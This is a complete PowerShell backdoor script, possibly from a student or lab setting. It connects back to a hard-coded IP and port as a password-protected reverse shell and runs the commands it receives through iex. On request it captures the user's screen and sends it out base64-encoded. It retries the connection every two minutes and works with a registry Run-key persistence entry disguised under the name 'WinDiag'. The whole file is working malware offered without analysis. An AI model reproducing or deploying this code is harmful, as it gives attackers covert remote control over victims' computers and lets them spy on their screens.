$ip = "192.168.1.15"
$port = 4444
$secret = "biskviti"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryName = "WinDiag"

function Get-Screenshot {
    param($StreamWriter)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Width  = $Screen.Bounds.Width
        $Height = $Screen.Bounds.Height
        $Top    = $Screen.Bounds.Top
        $Left   = $Screen.Bounds.Left
        $Bitmap = New-Object System.Drawing.Bitmap -ArgumentList $Width, $Height
        $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $Bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $Binary = $ms.ToArray()
        $Base64 = [Convert]::ToBase64String($Binary)
        
        $StreamWriter.WriteLine("---SCREENSHOT_START---")
        $StreamWriter.WriteLine($Base64)
        $StreamWriter.WriteLine("---SCREENSHOT_END---")
        
        $Graphic.Dispose()
        $Bitmap.Dispose()
        $ms.Dispose()
    } catch {
        $StreamWriter.WriteLine("Screenshot failed: " + $_.Exception.Message)
    }
}

function Start-AuthShell {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        # 1. AUTHENTICATION CHALLENGE
        $writer.WriteLine("PASSWORD REQUIRED:")
        $timer = [System.Diagnostics.Stopwatch]::StartNew()
        $authenticated = $false

        while ($timer.Elapsed.TotalSeconds -lt 15) {
            if ($stream.DataAvailable) {
                if ($reader.ReadLine() -eq $secret) {
                    $authenticated = $true
                    break
                } else {
                    # WRONG PASSWORD = SELF DESTRUCT
                    Remove-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue
                    $writer.WriteLine("WRONG PASSWORD. PERSISTENCE REMOVED. EXITING.")
                    exit
                }
            }
            Start-Sleep -Milliseconds 500
        }

        if ($authenticated) {
            $writer.WriteLine("ACCESS GRANTED. COMMANDS: 'shot' for screen, 'exit' to close.")
            
            while($true) {
                $writer.Write("B15cu1t@FINKI:" + (Get-Location).Path + "> ")
                $cmd = $reader.ReadLine()
                
                if ($cmd -eq "exit") { break }
                elseif ($cmd -eq "shot") { Get-Screenshot -StreamWriter $writer }
                elseif ($null -ne $cmd) {
                    $val = iex $cmd 2>&1 | Out-String
                    $writer.WriteLine($val)
                }
            }
        }
        $client.Close()
    } catch {
        # RETRY EVERY 2 MINUTES IF NO LISTENER
        Start-Sleep -Seconds 120
        Start-AuthShell
    }
}

Start-AuthShell
